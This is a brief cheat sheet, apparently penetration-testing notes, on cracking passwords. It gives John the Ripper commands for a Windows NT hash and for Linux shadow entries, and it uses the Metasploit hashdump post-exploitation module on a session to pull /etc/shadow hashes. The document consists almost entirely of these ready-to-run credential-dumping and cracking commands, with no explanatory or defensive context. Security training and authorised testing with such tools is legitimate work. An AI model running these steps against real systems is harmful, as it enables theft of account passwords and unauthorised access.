# Passwords Cracking

## Windows SAM
```bash
echo "8846F7EAEE8FB117AD06BDD830B7586C" > hashfile.txt
john --format=NT --wordlist=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt hashfile.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
john --show hashfile.txt
```

## Linux Shadow
```bash
use post/linux/gather/hashdump
set SESSION 1
exploit

# ---

use auxiliary/analyze/crack_linux
set SHA512 true
run

# ---

echo "root:x:0:0:root:/root:/bin/bash" > passwd.txt
echo "root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7:::" > shadow.txt
unshadow passwd.txt shadow.txt > unshadowed.txt

john --wordlist=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

john --show unshadowed.txt
```